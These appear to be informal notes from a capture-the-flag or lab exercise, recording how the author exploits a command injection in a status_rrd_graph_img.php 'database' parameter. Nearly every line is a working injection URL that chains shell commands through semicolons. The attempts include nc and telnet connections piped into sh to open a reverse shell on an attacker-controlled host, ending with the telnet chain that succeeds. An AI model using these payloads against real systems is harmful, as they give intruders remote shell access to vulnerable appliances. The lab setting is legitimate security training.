command injection:

can execute command like this:
https://10.10.10.60/status_rrd_graph_img.php?database=queues;nc+10.10.15.41+4444

https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;nc+10.10.15.41+445+|+sh
I can make the service ping me, but can't seems to get a reverse shell up.

curl maybe to download file ? 
Maybe the port am using on NC get blocked try 80 or 443

try telnet reserve shell to see if both command get executed

Test is both commands get executed
https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;telnet+10.10.15.41+80+|+telnet+10.10.15.41+445
both commands get executed, but connection fails med det samme. 
all three ?
works to get shell
https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+bin;telnet+10.10.14.236+80+|+sh+|+telnet+10.10.14.236+443
